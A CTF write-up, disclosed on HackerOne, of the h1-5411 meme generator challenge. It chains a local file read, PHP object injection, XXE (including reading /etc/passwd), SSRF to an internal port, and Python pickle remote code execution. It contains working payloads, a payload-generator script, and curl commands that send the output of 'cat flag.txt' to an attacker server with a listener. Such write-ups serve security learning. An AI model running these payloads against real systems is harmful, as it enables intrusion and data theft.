# H1-5411 CTF Write-up by erbbysam and ziot

## Report Details
- **Report ID**: 415137
- **URL**: https://hackerone.com/reports/415137
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2018-09-27T00:05:41.201Z
- **Disclosed**: 2018-10-22T16:01:45.219Z

## Reporter
- **Username**: ziot
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-5411-ctf

## Vulnerability Information
@erbbysam and I recently set out to beat the latest CTF challenge hosted by HackerOne. Here is a write-up with the process we took from start to finish.

The h1-5411 CTF begins with a tweet from HackerOne:
 * https://twitter.com/Hacker0x01/status/1044974142150373378

{F351665}

This leads to a website called the HackerOne Meme Generator:
 * https://h1-5411.h1ctf.com/

The website allows you to select a meme template, top text, and bottom text. This generates a meme saved to your session that is either an image or txt file.

{F351664}

***Generating a Meme***

The POST request looks like the following:

```
POST /api/generate.php HTTP/1.1
Host: h1-5411.h1ctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://h1-5411.h1ctf.com/generate.php
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 63
Cookie: PHPSESSID=qpvh9cil4heghbjdq6cp4vfbgs
Connection: close

template=template4.txt&type=text&top-text=test&bottom-text=test
```

The template parameter sets a filename to use as part of the meme generation process.

{F351666}

As you may guess, the template variable is vulnerable to Local-File Read (LFR). As long as you set it to a txt template, you can specify any arbitrary file on the system and fetch its’ file contents. Here’s an example of fetching PHP source code:

{F351667}

Here you can see the source code when viewing your saved memes:

{F351668}

After enumerating from index.php to all the files inside of each file include(), we eventually have the source code for the entire application. The next step is to figure out what other vulnerabilities exist in the app.

In the ***/includes/classes.php*** file the first thing that stands out is that they are intentionally disabling XXE protection.

{F351669}

That means the DOMDocument->loadXML() is vulnerable to external entities/DTDs and would allow us to execute malicious XXE payloads. The question from here is, how do we set ConfigFile class’s config_raw variable.

From the ***/includes/header.php*** file, there are two interesting files that you cannot discover without the LFR vulnerability.

 * /import_memes_2.0.php
 * /export_memes_2.0.php

Each one sends a POST request to files of the same name in the /api/ directory.

***/api/import_memes_2.0.php***

```
<?php
  require_once("../includes/config.php");

  if (isset($_FILES['f'])) {
    $new_memes = unserialize(base64_decode(
      file_get_contents($_FILES['f']['tmp_name'])));
    $_SESSION['memes'] = array_merge($_SESSION['memes'], $new_memes);
  }

  header("Location: /memes.php");
?>
```

***/api/export_memes_2.0.php***

```
<?php
  require_once("../includes/config.php");

  header('Content-Type: application/octet-stream');
  header('Content-Disposition: attachment; filename="'.time().'_export.memepak"');
  echo base64_encode(serialize($_SESSION['memes']));
?>
```

With the import API script, we are able to specify input into unserialize() with file upload POST requests. The uploaded unserialized data gets merged into $_SESSION[“memes”] where all of your memes are saved.

Now that we knew we could create PHP objects via unserialize (object injection) and knowing that there is an XXE in the ConfigFile class, we had to figure out how to put it all together.

The ConfigClass has a magic method function __toString() that will get called any time the class is initialized and treated as a string. That usually means whenever the variable that has the class assigned to is echo, print, print_r, etc.

```
    function __toString() {
      $this->parse();
      $debug = "";
      $debug .= "Debug Info :\n";
      $debug .= "TopText => {$this->top_text}\n";
      $debug .= "BottomText => {$this->bottom_text}\n";
      $debug .= "Template Location => {$this->template}\n";
      $debug .= "Template Type => {$this->type}\n";
      return $debug;
    }
```

We’ll talk about how that gets triggered after further explaining the attack. Following the __toString() execution chain, we see that it immediately calls the parse() function.

```
    function parse() {
      $dom = new DOMDocument();
      $dom->loadXML($this->config_raw, LIBXML_NOENT | LIBXML_DTDLOAD);
      $o = simplexml_import_dom($dom);

      $this->top_text = $o->toptext;
      $this->bottom_text = $o->bottomtext;
      $this->template = $o->template;
      $this->type = $o->type;
    }
```

This is promising because $this->config_raw gets passed into the vulnerable loadXML() function call and does not get overwritten with anything static. That means if we create an object that gets unserialized, we can specify the config_raw variable and it will execute our XXE payload.
We setup a test script by ripping out all the code involved in this attack chain in order to test it locally with warnings enabled. Their server is not displaying any PHP errors or warnings meaning we’re completely blind to any potential roadblocks that we run into. 

Here is a gist of the test code we were playing with:

 * https://gist.githubusercontent.com/ziot/e72c8c45865ea86d9c6aa6975615e839/raw/d0fb09a5a99be0c815c3e854e5b9900f2384b5dd/gistfile1.txt

Using the script above, we ran base64_encode(serialize()) functions on top of the newly created class after specifying our XXE payload inside of config_raw.

Example:

```
class ConfigFile {
    ...
}

$test = new ConfigFile("asdf");
$test->config_raw = '<?xml version="1.0" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY % sp SYSTEM "https://xss.buer.haus/ev.xml">%sp;%param1;]><r>&exfil;</r>';

echo base64_encode(serialize($test));
```

The next step was uploading it using the import_memes script:
 * https://h1-5411.h1ctf.com/import_memes_2.0.php

{F351670}

No dice. We run into a warning saying we cannot array_merge an array and an object. It makes sense, looking back on the code in /includes/config.php we can see that $_SESSION[“memes”] is an array() and gets strings stored in it.
```
  // Start/Resume session
  session_start();

  // Setup session
  if (!isset($_SESSION['memes'])) {
    $_SESSION['memes'] = array();
  }
```

So in order for our object to get stored into the $_SESSION[“memes”], we have to wrap the serialized object in an array. That complicates things because the only way we found to exploit the toString() method was that the $_SESSION[“memes”] was echo’d on the export script. That means we needed to find a new way for it to execute the toString magic method.

Lucky for us, we discovered this in the generate.php file.

```
        foreach($_SESSION['memes'] as $meme) {
      ?>
        <iframe width="100%" height="450" frameborder="0"
                src="<?php echo htmlentities($meme); ?>"></iframe>
      <?php
        }
      }
      ?>
```



As you can see in the code, it loops through all the items in the $_SESSION[“meme”] array and displays them via echo. When it hits our object stored in the array, it’ll trigger toString() and thus eventually execute our XXE payload.

Here is an example of loading file:///etc/passwd using the XXE payload:

```
class ConfigFile {
    ...
}

$test = new ConfigFile("asdf");
$test->config_raw = '<?xml version="1.0"?><!DOCTYPE root[<!ENTITY foo SYSTEM "file:///etc/passwd">]><test><toptext>dddrrr &foo;</toptext></test>';

echo base64_encode(serialize(array($test)));
```

{F351671}

Boom! We confirmed that we finally got XXE working.

So what do we do next? Well, we already have local-file read, so it probably has nothing to do with that. We remembered that we saw a mention of localhost in one of the files. XXE gives us the ability to perform Server-Side Request Forgery and due to the XML being rendered back to the user, it was not blind either. This gives us the ability to fetch and view internal websites or services.

This was a comment in ***/includes/classes.php***

```
  /* Maintenance service: internal service on localhost, still under development!!

  class Maintenance {
    function __construct() {
      //TODO
    }
  }
 
  */
```

We started to try various http:// calls to localhost but we were not having any luck. Eventually we guessed it may be on a random port and our first guess was correct! We got a response from querying http://localhost:1337. The maintenance service was on the port ***1337***.

The non-blind XXE payload was critical for discovering the 1337 port and functionality:

```
<?xml version="1.0"?>
<!DOCTYPE root
[
<!ENTITY foo SYSTEM "php://filter/convert.base64-encode/resource=http://localhost:1337/">
]><test><toptext> &foo;</toptext></test>
```

And this would return:

```
Meme Service - Internal Maintenance API - v0.1 (Alpha); API Documentation: Version 0.1 - Endpoints: 
/status - View maintenance status; 
/update-status Change maintenance status; 
Debug: The debug parameter allows debugging;
```

Oh no, more challenges to solve.

Accessing /status?debug=1 printed:

```
Maintenance mode: off | Debug: KGlhcHAKU3RhdHVzCnAxCihkcDIKUydtZXNzYWdlJwpwMwpTJ01haW50ZW5hbmNlIG1vZGU6IG9mZicKcDQKc1MnbWFpbnRlbmFuY2UnCnA1CkkwMApzYi4=
```

Base64 decoding the string we immediately recognized that it was Python pickle. This is essentially Python's version of serialization and has similar object injection vulnerabilities. However, Python pickle generally just leads immediately to Remote Code Execution.

```
(iapp
Status
p1
(dp2
S'message'
p3
S'Maintenance mode: off'
p4
sS'maintenance'
p5
I00
Sb.
```

Therefore, we should try and update the status with a “malicious” pickle!

Sending through a valid formed pickle to /update-status?status=<base64 pickle>&debug=1 resulted in the message:

```
A new status has been loaded. Automatic reloading not implemented yet!
```

There was no impact to the /status page unfortunately (a malformed pickle would show error output), this means we have to work blind, lucily this “malicious” pickle payload generator worked!  So our strategy going forward was to use this with curl commands:
https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd

Ran as:
```
# python pickle.py 'curl -X POST -d "|$(cat flag.txt)|" myserver.com'
Y3Bvc2l4CnN5c3RlbQpwMQooUydjdXJsIC1YIFBPU1QgLWQgInwkKGNhdCBmbGFnLnR4dCl8IiBteXNlcnZlci5jb20nCnAyCnRScDMKLg==
```


Add to php payload:

```
$test->config_raw = '<?xml version="1.0"?>
<!DOCTYPE root
[
<!ENTITY foo SYSTEM "php://filter/convert.base64-encode/resource=http://localhost:1337/update-status?status=Y3Bvc2l4CnN5c3RlbQpwMQooUydjdXJsIC1YIFBPU1QgLWQgInwkKGNhdCBmbGFnLnR4dCl8IiBteXNlcnZlci5jb20nCnAyCnRScDMKLg==&debug=1">
]><test><toptext> &foo;</toptext></test>';
```

New mypack file to upload:
```
YToxOntpOjA7TzoxMDoiQ29uZmlnRmlsZSI6MTp7czoxMDoiY29uZmlnX3JhdyI7czozMTA6Ijw/eG1sIHZlcnNpb249IjEuMCI/Pg0KPCFET0NUWVBFIHJvb3QNClsNCjwhRU5USVRZIGZvbyBTWVNURU0gInBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9aHR0cDovL2xvY2FsaG9zdDoxMzM3L3VwZGF0ZS1zdGF0dXM/c3RhdHVzPVkzQnZjMmw0Q25ONWMzUmxiUXB3TVFvb1V5ZGpkWEpzSUMxWUlGQlBVMVFnTFdRZ0lud2tLR05oZENCbWJHRm5MblI0ZENsOElpQnRlWE5sY25abGNpNWpiMjBuQ25BeUNuUlNjRE1LTGc9PSZkZWJ1Zz0xIj4NCl0+PHRlc3Q+PHRvcHRleHQ+ICZmb287PC90b3B0ZXh0PjwvdGVzdD4iO319
```

When memes.php is visited again, simply get the POST response with a simple tornado listener:

```
import tornado.ioloop
import tornado.web

class MainHandler(tornado.web.RequestHandler):
    def post(self):
        print self.request.body

def make_app():
    return tornado.web.Application([
        (r"/.*", MainHandler),
    ])

if __name__ == "__main__":
    app = make_app()
    app.listen(80)
    tornado.ioloop.IOLoop.current().start()
```

Using this method to look at the file system (“python pickle.py 'curl -X POST -d "|$(ls -lath)|" myserver.com”) yields:

```
total 36K
drwxr-xr-x 1 root        root        4.0K Sep 26 16:20 ..
drwxr-xr-x 1 maintenance maintenance 4.0K Sep 26 16:19 .
drwxr-xr-x 1 maintenance maintenance 4.0K Sep 26 16:19 static
-rw-r--r-- 1 maintenance maintenance 1.7K Sep 23 19:28 app.py
-rw-r--r-- 1 maintenance maintenance 3.4K Sep 23 19:11 app.pyc
-rw-r--r-- 1 maintenance maintenance  150 Sep 23 19:07 flag.txt
-rw-r--r-- 1 maintenance maintenance   14 Sep 18 17:50 requirements.txt
-rw-r--r-- 1 maintenance maintenance   89 Sep 18 17:50 status.pickle
drwxr-xr-x 1 maintenance maintenance 4.0K Sep 18 17:50 templates
```

Using this method to look at flag.txt (“python pickle.py 'curl -X POST -d "|$(cat flag.txt)|" myserver.com”) shows the flag:

```
Yay! Here is your flag:

flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}


Go to https://hackerone.com/h1-5411-ctf and submit your writeup!
```

PHP code used to generate payload (this works on http://sandbox.onlinephpfunctions.com/):

```
<?php

$qqq= array("test", "abc");

class ConfigFile {
    function __construct($url) {
      $this->config_raw = $url;//file_get_contents($url);
    }
    function parse() {
        echo '<p>DEBUG: parse() hit (current config_raw = '.htmlspecialchars($this->config_raw).' )</p>';
      $dom = new DOMDocument();
      $dom->loadXML($this->config_raw, LIBXML_NOENT | LIBXML_DTDLOAD);
      $o = simplexml_import_dom($dom);

      $this->top_text = $o->toptext;
      $this->bottom_text = $o->bottomtext;
      $this->template = $o->template;
      $this->type = $o->type;
    }

    function generate() {
      $this->parse();
      $meme_path = "https://giphy.com/embed/Vuw9m5wXviFIQ?try_harder";
      if ($this->type == IMAGE) {
        if (@is_array(getimagesize($this->path))) {
          $meme_path = MEMES_FOLDER . $filename . ".jpg";
          $args = array(
            "top_text"    => $top_text,
            "bottom_text" => $bottom_text,
            "filename"    => $meme_path,
            "font"        => FONT_BASE,
            "memebase"    => $this->path,
            "textsize"    => 40,
            "textfit"     => true,
            "padding"     => 10,
          );
          memegen_build_image($args);
        }
      }
      if ($this->type == TEXT) {
        if (!@is_array(getimagesize($this->path))) {
          $contents = file_get_contents($this->path);
          $meme = "  " . strtoupper($top_text) . "\n\n" . $contents . "\n  " . strtoupper($bottom_text);
          $meme_path = MEMES_FOLDER . $filename . ".txt";
          file_put_contents($meme_path, $meme);
        }
      }
      return $meme_path;
    }
    function __toString() {
        echo '<p>DEBUG: toString() hit</p>';
      $this->parse();
      $debug = "";
      $debug .= "Debug Info :\n";
      $debug .= "TopText => {$this->top_text}\n";
      $debug .= "BottomText => {$this->bottom_text}\n";
      $debug .= "Template Location => {$this->template}\n";
      $debug .= "Template Type => {$this->type}\n";
      return $debug;
    }
}

$test = new ConfigFile("asdf");

$test->config_raw = '<?xml version="1.0"?>
<!DOCTYPE root
[
<!ENTITY foo SYSTEM "php://filter/convert.base64-encode/resource=http://localhost:1337/update-status?status=Y3Bvc2l4CnN5c3RlbQpwMQooUydjdXJsIC1YIFBPU1QgLWQgInwkKGNhdCBmbGFnLnR4dCl8IiBteXNlcnZlci5jb20nCnAyCnRScDMKLg==&debug=1">
]><test><toptext> &foo;</toptext></test>';

$serialized = base64_encode(serialize(array($test)));

// test to make sure array_merge still works
$new_memes = unserialize(base64_decode($serialized));
$qqq = array_merge($qqq, $new_memes);

// print it
echo $serialized;

?>

```

## Impact

Content injection

## Attachments
- 2.png
- 1.png
- 3.png
- 4.png
- 5.png
- 6.png
- 7.png
- 8.png
